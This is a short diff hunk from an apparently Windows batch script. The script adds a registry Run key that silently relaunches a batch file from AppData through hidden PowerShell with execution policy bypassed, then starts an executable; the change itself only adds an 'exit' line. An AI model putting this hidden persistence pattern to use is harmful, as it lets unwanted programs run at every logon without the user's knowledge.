@@ -22,3 +22,4 @@ reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%FOLDER%" >nu
     reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%FOLDER%" /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command Start-Process -WindowStyle Hidden '%APPDATA%\%FOLDER%\%TARGET_BAT%'" /f >nul 2>&1
 )
 start "" "%APPDATA%\%FOLDER%\%TARGET_EXE%"
+exit
